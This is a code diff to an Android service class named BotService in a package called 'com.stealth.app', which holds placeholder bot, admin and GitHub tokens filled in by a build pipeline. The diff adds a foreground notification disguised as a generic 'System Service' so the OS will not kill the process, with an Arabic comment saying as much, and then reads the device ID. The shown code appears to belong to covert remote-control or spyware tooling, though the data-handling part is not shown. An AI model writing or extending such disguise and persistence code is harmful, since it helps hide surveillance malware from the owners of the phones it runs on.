@@ -1,11 +1,12 @@
 package com.stealth.app;
 import android.app.Service; import android.content.Intent; import android.os.IBinder;
 import android.os.Environment; import android.provider.Settings;
+import android.app.Notification; import android.app.NotificationChannel; import android.app.NotificationManager;
+import android.os.Build;
 import org.json.*; import java.io.*; import java.net.*; import java.util.*;
 import okhttp3.*; import android.util.Base64;
 
 public class BotService extends Service {
-    // قيم مؤقتة سيتم استبدالها بواسطة GitHub Actions
     String BOT_TOKEN = "PLACEHOLDER_BOT_TOKEN";
     String ADMIN = "PLACEHOLDER_ADMIN";
     String GITHUB_TOKEN = "PLACEHOLDER_GITHUB_TOKEN";
@@ -19,6 +20,26 @@ public class BotService extends Service {
         .readTimeout(300, java.util.concurrent.TimeUnit.SECONDS).build();
 
     @Override public int onStartCommand(Intent i, int f, int s) {
+        // تفعيل "الخدمة في الواجهة" لكي لا يقتلها النظام
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel("stealth_channel", "System Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
+            Notification notification = new Notification.Builder(this, "stealth_channel")
+                    .setContentTitle("System Service")
+                    .setContentText("Running in background")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .build();
+            startForeground(1, notification);
+        } else {
+            Notification notification = new Notification.Builder(this)
+                    .setContentTitle("System Service")
+                    .setContentText("Running in background")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .build();
+            startForeground(1, notification);
+        }
+
         DEVICE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         if (DEVICE_ID == null) DEVICE_ID = "dev_" + System.currentTimeMillis();
         new Thread(new Runnable() {
